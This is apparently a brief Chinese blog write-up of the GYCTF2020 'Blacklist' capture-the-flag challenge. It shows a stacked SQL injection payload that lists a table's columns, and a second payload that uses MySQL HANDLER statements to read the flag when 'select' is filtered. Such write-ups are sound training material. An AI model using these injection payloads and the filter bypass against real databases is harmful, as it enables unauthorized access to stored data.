---
title: '[GYCTF2020]Blacklist'
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/avatar.jpg'
authorAbout: steamID：888007034
authorDesc: 'Blizzard：TroyeSivan#51769'
categories: 技术
comments: true
date: 2020-07-16 23:09:27
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/fwewqfgwrg.jpg
---
这道题好像在哪见过，应该是上次强网杯的那个堆叠注入。
1';show columns from FlagHere;#

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200716231845.png)

flag就在这里，但是select被过滤了，这里要利用HANDLER

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200716231935.png)

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200716232140.png)

1';handler FlagHere open;handler FlagHere read first;Handler FlagHere close;#
